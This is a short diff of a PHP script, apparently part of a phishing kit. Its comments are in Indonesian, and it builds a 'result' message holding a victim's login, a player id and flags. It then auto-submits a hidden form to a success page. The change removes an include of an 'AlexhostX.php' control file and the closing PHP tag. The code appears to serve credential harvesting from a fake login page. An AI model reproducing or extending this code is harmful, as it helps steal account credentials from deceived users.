@@ -36,7 +36,7 @@ $browser = $infos['browser_name'];
 
 // MENGAMBIL KONTROL
 include 'alexBackEnd/bendera.php';
-include 'alexBackEnd/AlexhostX.php';
+
 
 // KONTEN RESULT AKUN
 $subjek = "$resultFlags | $playid | Login $login";
@@ -285,5 +285,3 @@ echo "<form id='imnoob' method='POST' action='success.php'>
 </form>
 <script type='text/javascript'>document.getElementById('imnoob').submit();</script>";
 }
-
-?>
